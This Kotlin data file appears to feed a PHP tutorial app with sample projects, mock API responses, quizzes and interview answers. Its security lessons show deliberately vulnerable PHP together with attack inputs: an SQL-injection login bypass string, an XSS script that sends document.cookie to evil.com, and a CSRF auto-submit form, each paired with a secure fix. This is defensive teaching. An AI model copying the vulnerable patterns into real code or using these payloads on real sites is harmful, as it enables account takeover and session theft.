package com.example.data

import com.example.model.*

object PhpProjectsAndLabsData {

    val sampleProjects: List<ProjectItem> = listOf(
        ProjectItem(
            id = "proj-1",
            title = "Student Management System (MVC)",
            level = "Intermediate",
            description = "A complete PHP MVC application with MySQL database integration, prepared statements, and CRUD operations.",
            tags = listOf("PHP 8", "MySQL", "MVC", "PDO", "Bootstrap"),
            fileList = listOf(
                ProjectFile(
                    name = "index.php",
                    path = "public/index.php",
                    content = "<?php\nrequire_once '../app/bootstrap.php';\n\n\$router = new Core\\Router();\n\$router->dispatch(\$_SERVER['REQUEST_URI']);\n?>"
                ),
                ProjectFile(
                    name = "StudentController.php",
                    path = "app/Controllers/StudentController.php",
                    content = "<?php\nnamespace App\\Controllers;\nuse App\\Models\\Student;\n\nclass StudentController {\n    public function index() {\n        \$students = Student::all();\n        require_once '../app/Views/students/index.php';\n    }\n\n    public function store() {\n        Student::create([\n            'name' => \$_POST['name'],\n            'email' => \$_POST['email'],\n            'course' => \$_POST['course']\n        ]);\n        header('Location: /students');\n    }\n}\n?>"
                ),
                ProjectFile(
                    name = "Student.php",
                    path = "app/Models/Student.php",
                    content = "<?php\nnamespace App\\Models;\nuse Core\\Database;\nuse PDO;\n\nclass Student {\n    public static function all(): array {\n        \$db = Database::getConnection();\n        \$stmt = \$db->query('SELECT * FROM students ORDER BY id DESC');\n        return \$stmt->fetchAll(PDO::FETCH_ASSOC);\n    }\n\n    public static function create(array \$data): bool {\n        \$db = Database::getConnection();\n        \$stmt = \$db->prepare('INSERT INTO students (name, email, course) VALUES (:name, :email, :course)');\n        return \$stmt->execute(\$data);\n    }\n}\n?>"
                ),
                ProjectFile(
                    name = "db.sql",
                    path = "database/schema.sql",
                    content = "CREATE TABLE students (\n    id INT AUTO_INCREMENT PRIMARY KEY,\n    name VARCHAR(100) NOT NULL,\n    email VARCHAR(150) UNIQUE NOT NULL,\n    course VARCHAR(100) NOT NULL,\n    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP\n);"
                )
            ),
            milestones = listOf(
                "Set up MVC folder structure (Controllers, Models, Views)",
                "Create MySQL database connection with PDO",
                "Implement Student listing and dynamic table view",
                "Add secure student creation with prepared statements",
                "Implement Edit and Delete operations with validation"
            ),
            databaseSchema = "students (id, name, email, course, created_at)"
        ),
        ProjectItem(
            id = "proj-2",
            title = "RESTful Task Management API",
            level = "Advanced",
            description = "Production-ready REST API in PHP with Bearer Token authentication, JSON request validation, and proper HTTP error codes.",
            tags = listOf("PHP 8", "REST API", "JSON", "JWT Auth", "PDO"),
            fileList = listOf(
                ProjectFile(
                    name = "api.php",
                    path = "public/api.php",
                    content = "<?php\nheader('Content-Type: application/json');\nrequire_once '../vendor/autoload.php';\n\n\$method = \$_SERVER['REQUEST_METHOD'];\n\$endpoint = parse_url(\$_SERVER['REQUEST_URI'], PHP_URL_PATH);\n\nif (\$endpoint === '/api/v1/tasks' && \$method === 'GET') {\n    echo json_encode([\n        'status' => 'success',\n        'data' => [['id' => 1, 'task' => 'Learn PHP with Awiskar Acharya', 'done' => true]]\n    ]);\n}\n?>"
                )
            ),
            milestones = listOf(
                "Design RESTful URL endpoints and route handling",
                "Implement Bearer Token authentication middleware",
                "CRUD operations for Task resource returning JSON",
                "Semantic HTTP status codes (200, 201, 400, 401, 404)"
            )
        ),
        ProjectItem(
            id = "proj-3",
            title = "Secure PHP Authentication System",
            level = "Intermediate",
            description = "Rock-solid authentication with password_hash, CSRF tokens, session regeneration, and remember-me cookies.",
            tags = listOf("Security", "Sessions", "Cookies", "Bcrypt", "Auth"),
            fileList = listOf(
                ProjectFile(
                    name = "auth.php",
                    path = "app/auth.php",
                    content = "<?php\nsession_start();\n\nfunction login(string \$email, string \$password, PDO \$db): bool {\n    \$stmt = \$db->prepare('SELECT id, password_hash FROM users WHERE email = :email');\n    \$stmt->execute(['email' => \$email]);\n    \$user = \$stmt->fetch();\n\n    if (\$user && password_verify(\$password, \$user['password_hash'])) {\n        session_regenerate_id(true);\n        \$_SESSION['user_id'] = \$user['id'];\n        return true;\n    }\n    return false;\n}\n?>"
                )
            ),
            milestones = listOf(
                "User registration with Bcrypt password hashing",
                "CSRF token generation and validation",
                "Session fixation defense via session_regenerate_id()",
                "Protected user dashboard with access guard"
            )
        ),
        ProjectItem(
            id = "proj-4",
            title = "Dynamic E-Commerce Backend",
            level = "Advanced",
            description = "E-commerce order processing system with shopping cart session management, product inventory, and checkout simulation.",
            tags = listOf("E-Commerce", "Sessions", "MySQL", "Transactions", "OOP"),
            fileList = listOf(
                ProjectFile(
                    name = "Cart.php",
                    path = "app/Cart.php",
                    content = "<?php\nclass Cart {\n    public function addProduct(int \$productId, int \$qty = 1) {\n        \$_SESSION['cart'][\$productId] = (\$_SESSION['cart'][\$productId] ?? 0) + \$qty;\n    }\n    public function total(): float {\n        return 199.95;\n    }\n}\n?>"
                )
            ),
            milestones = listOf(
                "Database schema for Products, Orders, and OrderItems",
                "Session-based shopping cart",
                "Database transactions for atomic order creation",
                "Simulated payment verification callback"
            )
        )
    )

    val sampleDatabaseRows: List<DatabaseRow> = listOf(
        DatabaseRow(1, "Awiskar Acharya", "awiskar@example.com", "Admin & Instructor", "Active"),
        DatabaseRow(2, "Rohan Sharma", "rohan@example.com", "Student Developer", "Active"),
        DatabaseRow(3, "Sneha Thapa", "sneha@example.com", "Frontend to Backend", "Active"),
        DatabaseRow(4, "Priya Patel", "priya@example.com", "WordPress Engineer", "Pending"),
        DatabaseRow(5, "Amit Gurung", "amit@example.com", "Full-Stack Learner", "Active")
    )

    val apiEndpoints: List<ApiPlaygroundEndpoint> = listOf(
        ApiPlaygroundEndpoint(
            id = "ep-1",
            method = "GET",
            path = "/api/v1/students",
            title = "List Students",
            description = "Fetch all active students enrolled in the PHP Masterclass.",
            defaultHeaders = mapOf(
                "Accept" to "application/json",
                "Authorization" to "Bearer php_secret_token_2026"
            ),
            defaultBody = "",
            responseStatus = 200,
            responseHeaders = mapOf(
                "Content-Type" to "application/json; charset=utf-8",
                "X-Powered-By" to "PHP/8.3.4",
                "Cache-Control" to "no-cache, private"
            ),
            responseBody = "{\n  \"status\": \"success\",\n  \"count\": 3,\n  \"data\": [\n    {\"id\": 1, \"name\": \"Awiskar Acharya\", \"role\": \"Lead Engineer\"},\n    {\"id\": 2, \"name\": \"Rohan Sharma\", \"role\": \"Student\"},\n    {\"id\": 3, \"name\": \"Sneha Thapa\", \"role\": \"Learner\"}\n  ]\n}"
        ),
        ApiPlaygroundEndpoint(
            id = "ep-2",
            method = "POST",
            path = "/api/v1/students",
            title = "Create New Student",
            description = "Register a new student record into MySQL database.",
            defaultHeaders = mapOf(
                "Content-Type" to "application/json",
                "Authorization" to "Bearer php_secret_token_2026"
            ),
            defaultBody = "{\n  \"name\": \"Suman Adhikari\",\n  \"email\": \"suman@learnphp.dev\",\n  \"course\": \"Laravel & Modern PHP\"\n}",
            responseStatus = 201,
            responseHeaders = mapOf(
                "Content-Type" to "application/json",
                "Location" to "/api/v1/students/6"
            ),
            responseBody = "{\n  \"status\": \"created\",\n  \"id\": 6,\n  \"message\": \"Student registered successfully via PDO!\"\n}"
        ),
        ApiPlaygroundEndpoint(
            id = "ep-3",
            method = "PUT",
            path = "/api/v1/students/2",
            title = "Update Student",
            description = "Update details of an existing student.",
            defaultHeaders = mapOf(
                "Content-Type" to "application/json",
                "Authorization" to "Bearer php_secret_token_2026"
            ),
            defaultBody = "{\n  \"role\": \"Senior PHP Apprentice\",\n  \"status\": \"Active\"\n}",
            responseStatus = 200,
            responseHeaders = mapOf("Content-Type" to "application/json"),
            responseBody = "{\n  \"status\": \"updated\",\n  \"id\": 2,\n  \"message\": \"Record updated in MySQL.\"\n}"
        ),
        ApiPlaygroundEndpoint(
            id = "ep-4",
            method = "DELETE",
            path = "/api/v1/students/5",
            title = "Delete Student",
            description = "Soft delete student from database.",
            defaultHeaders = mapOf(
                "Authorization" to "Bearer php_secret_token_2026"
            ),
            defaultBody = "",
            responseStatus = 200,
            responseHeaders = mapOf("Content-Type" to "application/json"),
            responseBody = "{\n  \"status\": \"deleted\",\n  \"message\": \"Student record archived successfully.\"\n}"
        )
    )

    val securityTopics: List<SecuritySimTopic> = listOf(
        SecuritySimTopic(
            id = "sec-sqli",
            title = "SQL Injection (SQLi) Defense",
            type = "SQL Injection",
            description = "See how attackers manipulate queries with unescaped input, and how PDO prepared statements completely neutralize the threat.",
            vulnerableCode = "// DANGEROUS: Direct string concatenation\n\$user = \$_POST['username'];\n\$pass = \$_POST['password'];\n\$sql = \"SELECT * FROM users WHERE user = '\$user' AND pass = '\$pass'\";\n\$db->query(\$sql);",
            vulnerableExplanation = "If the attacker enters ' OR '1'='1 as username, the SQL condition becomes always TRUE, dumping all accounts without needing a password!",
            attackInputExample = "' OR '1'='1' --",
            attackResult = "Query: SELECT * FROM users WHERE user = '' OR '1'='1' --' ... -> AUTH BYPASSED! Attacker logged in as SuperAdmin!",
            secureCode = "// SECURE: PDO Parameterized Query\n\$stmt = \$pdo->prepare('SELECT * FROM users WHERE user = :user');\n\$stmt->execute(['user' => \$_POST['username']]);\n\$account = \$stmt->fetch();\nif (\$account && password_verify(\$_POST['password'], \$account['hash'])) {\n    // authenticated safely!\n}",
            secureExplanation = "Prepared statements send SQL structure first, then parameters separately. The input is treated strictly as literal string data, never as executable SQL code.",
            defensePrinciple = "Always use PDO or MySQLi prepared statements with bound parameters. Never concatenate variables into SQL strings."
        ),
        SecuritySimTopic(
            id = "sec-xss",
            title = "Cross-Site Scripting (XSS) Defense",
            type = "XSS",
            description = "Understand how malicious script injection works in HTML output and how htmlspecialchars() neutralizes it.",
            vulnerableCode = "// DANGEROUS: Unescaped echo\n\$search = \$_GET['q'];\necho \"<h1>Search Results for: \" . \$search . \"</h1>\";",
            vulnerableExplanation = "An attacker crafts a URL with <script>fetch('https://evil.com/steal?c='+document.cookie)</script>. The victim's browser executes the script and leaks session cookies!",
            attackInputExample = "<script>alert('XSS Exploit')</script>",
            attackResult = "Browser executes raw Javascript: alert popup fires or cookies are stolen!",
            secureCode = "// SECURE: HTML entity encoding\n\$search = htmlspecialchars(\$_GET['q'] ?? '', ENT_QUOTES, 'UTF-8');\necho \"<h1>Search Results for: \" . \$search . \"</h1>\";",
            secureExplanation = "htmlspecialchars converts '<' to '&lt;' and '>' to '&gt;'. The browser displays them as harmless visual characters, not executable tags.",
            defensePrinciple = "Always sanitize output with htmlspecialchars(..., ENT_QUOTES, 'UTF-8') or use a templating engine like Blade/Twig that escapes automatically."
        ),
        SecuritySimTopic(
            id = "sec-csrf",
            title = "Cross-Site Request Forgery (CSRF)",
            type = "CSRF",
            description = "Prevent malicious third-party sites from tricking an authenticated user's browser into performing unwanted actions.",
            vulnerableCode = "// DANGEROUS: Action without CSRF token\nif (\$_SERVER['REQUEST_METHOD'] === 'POST') {\n    transferFunds(\$_POST['to_account'], \$_POST['amount']);\n}",
            vulnerableExplanation = "A malicious site hosts an invisible form that auto-submits a POST request to your bank. Because the user is logged in, their session cookie is sent automatically!",
            attackInputExample = "<form action='https://bank.com/transfer' method='POST'> ...",
            attackResult = "Funds transferred without user intent because session was valid.",
            secureCode = "// SECURE: CSRF Token Check\nif (!hash_equals(\$_SESSION['csrf_token'], \$_POST['csrf_token'] ?? '')) {\n    die('CSRF Token Validation Failed!');\n}\ntransferFunds(\$_POST['to_account'], \$_POST['amount']);",
            secureExplanation = "A cryptographically secure random token is stored in \$_SESSION and included as a hidden field in the form. External sites cannot read or guess this token.",
            defensePrinciple = "Include a unique, unpredictable CSRF token in all state-modifying POST/PUT/DELETE forms."
        )
    )

    val quizQuestions: List<QuizItem> = listOf(
        QuizItem(
            id = "q-1",
            topic = "PHP Syntax",
            question = "Which PHP statement is used to output text to the browser?",
            options = listOf("echo", "print_out", "console.log", "write"),
            correctIndex = 0,
            explanation = "'echo' and 'print' are language constructs in PHP used to output text. 'echo' is most commonly used."
        ),
        QuizItem(
            id = "q-2",
            topic = "Variables",
            question = "Which symbol is mandatory before all variable names in PHP?",
            options = listOf("@", "$", "#", "&"),
            correctIndex = 1,
            explanation = "In PHP, every variable name must begin with a dollar sign ($), e.g. \$username."
        ),
        QuizItem(
            id = "q-3",
            topic = "Security",
            question = "Which PHP function is the industry standard for securely hashing user passwords?",
            options = listOf("md5()", "sha1()", "password_hash()", "base64_encode()"),
            correctIndex = 2,
            explanation = "password_hash() uses modern memory-hard algorithms like Bcrypt and Argon2id with automatic salt generation."
        ),
        QuizItem(
            id = "q-4",
            topic = "Database",
            question = "Why are PDO prepared statements immune to SQL injection?",
            options = listOf(
                "Because they encrypt the database tables",
                "Because SQL instructions and user data parameters are sent separately",
                "Because they only run on Apache servers",
                "Because they convert everything to JSON"
            ),
            correctIndex = 1,
            explanation = "Prepared statements compile the SQL command structure first; subsequent data parameters are strictly treated as string literals, never executable code."
        ),
        QuizItem(
            id = "q-5",
            topic = "Modern PHP",
            question = "What does the match expression introduced in PHP 8 do differently than switch?",
            options = listOf(
                "It uses strict (===) comparison and returns a value without needing 'break'",
                "It only works with integers",
                "It requires a database connection",
                "It executes in the browser"
            ),
            correctIndex = 0,
            explanation = "match() evaluates strictly with ===, does not fall through, and returns the result of the matched branch directly."
        )
    )

    val interviewQuestions: List<InterviewItem> = listOf(
        InterviewItem(
            id = "int-1",
            category = "Core PHP",
            question = "Explain the difference between include, require, include_once, and require_once.",
            answer = "'include' emits an E_WARNING if the file is missing and continues execution, while 'require' throws a fatal E_COMPILE_ERROR and halts the script. The '_once' variants ensure the file is not loaded more than once, preventing duplicate class or function definitions.",
            codeSample = "require_once __DIR__ . '/vendor/autoload.php';"
        ),
        InterviewItem(
            id = "int-2",
            category = "Database & Architecture",
            question = "What are the benefits of using PDO over procedural MySQLi?",
            answer = "1) Database abstraction: PDO supports 12+ database drivers (MySQL, PostgreSQL, SQLite, etc.) with identical APIs. 2) Named parameters in prepared statements. 3) Object-oriented fetch modes (FETCH_CLASS, FETCH_ASSOC). 4) Powerful exception-based error handling.",
            codeSample = "\$pdo = new PDO('mysql:host=localhost;dbname=test', 'user', 'pass', [\n    PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION\n]);"
        ),
        InterviewItem(
            id = "int-3",
            category = "Web Security",
            question = "How does PHP manage session state and how do you protect against session hijacking?",
            answer = "PHP assigns a unique session ID stored in a PHPSESSID cookie on the client. On the server, session variables are serialized in files or Redis. Defenses: 1) Call session_regenerate_id(true) on login. 2) Enable session.cookie_httponly = 1 so JS cannot read it. 3) Enable session.cookie_secure = 1 for HTTPS. 4) Use SameSite=Strict.",
            codeSample = "session_start([\n    'cookie_httponly' => true,\n    'cookie_secure' => true,\n    'cookie_samesite' => 'Strict'\n]);"
        ),
        InterviewItem(
            id = "int-4",
            category = "Frameworks",
            question = "What is the role of Composer and PSR-4 in modern PHP applications?",
            answer = "Composer is the dependency manager for PHP packages. PSR-4 is the PHP Standard Recommendation for class autoloading: it maps namespaces directly to file system directories (e.g. namespace App\\Controllers maps to src/Controllers/). This eliminates manual require_once statements across the application.",
            codeSample = "\"autoload\": {\n    \"psr-4\": {\n        \"App\\\\\": \"src/\"\n    }\n}"
        )
    )

    val achievements: List<AchievementBadge> = listOf(
        AchievementBadge("ach-1", "First PHP Script", "Wrote and executed your first PHP code with echo", "terminal", true),
        AchievementBadge("ach-2", "Variable Master", "Explored scalar data types and symbol tables", "data_object", true),
        AchievementBadge("ach-streak", "7-Day Streak", "Consistent coding practice across 7 days", "local_fire_department", true),
        AchievementBadge("ach-db", "Database Architect", "Executed PDO prepared statements in MySQL Lab", "database", false),
        AchievementBadge("ach-api", "API Engineer", "Built and tested RESTful JSON endpoints", "api", false),
        AchievementBadge("ach-sec", "Security Shield", "Neutralized SQL Injection and XSS vulnerabilities", "verified_user", false),
        AchievementBadge("ach-laravel", "Laravel Pioneer", "Explored Eloquent relationships and routes", "rocket_launch", false),
        AchievementBadge("ach-cert", "Master of PHP", "Completed curriculum and generated official certificate", "workspace_premium", false)
    )

    val functionReferences: List<PhpFunctionReference> = listOf(
        PhpFunctionReference(
            name = "password_hash",
            category = "Security",
            syntax = "password_hash(string \$password, string|int|null \$algo, array \$options = []): string",
            description = "Creates a secure password hash using a one-way mathematical hashing algorithm (Bcrypt or Argon2).",
            example = "\$hash = password_hash('my_pass', PASSWORD_BCRYPT);",
            output = "\$2y$10\$e8Fv29L0QG7K9Z..."
        ),
        PhpFunctionReference(
            name = "htmlspecialchars",
            category = "Strings & Security",
            syntax = "htmlspecialchars(string \$string, int \$flags = ENT_QUOTES | ENT_SUBSTITUTE, ?string \$encoding = null, bool \$double_encode = true): string",
            description = "Converts special characters like <, >, &, ' and \" into HTML entities to prevent XSS attacks.",
            example = "\$safe = htmlspecialchars(\"<script>alert(1)</script>\", ENT_QUOTES, 'UTF-8');",
            output = "&lt;script&gt;alert(1)&lt;/script&gt;"
        ),
        PhpFunctionReference(
            name = "json_encode",
            category = "JSON & API",
            syntax = "json_encode(mixed \$value, int \$flags = 0, int \$depth = 512): string|false",
            description = "Returns the JSON representation of a value or associative array.",
            example = "\$json = json_encode(['status' => 'success', 'code' => 200]);",
            output = "{\"status\":\"success\",\"code\":200}"
        ),
        PhpFunctionReference(
            name = "array_map",
            category = "Arrays",
            syntax = "array_map(?callable \$callback, array \$array, array ...\$arrays): array",
            description = "Applies the callback to the elements of the given arrays.",
            example = "\$doubled = array_map(fn(\$n) => \$n * 2, [1, 2, 3]);",
            output = "[2, 4, 6]"
        )
    )
}
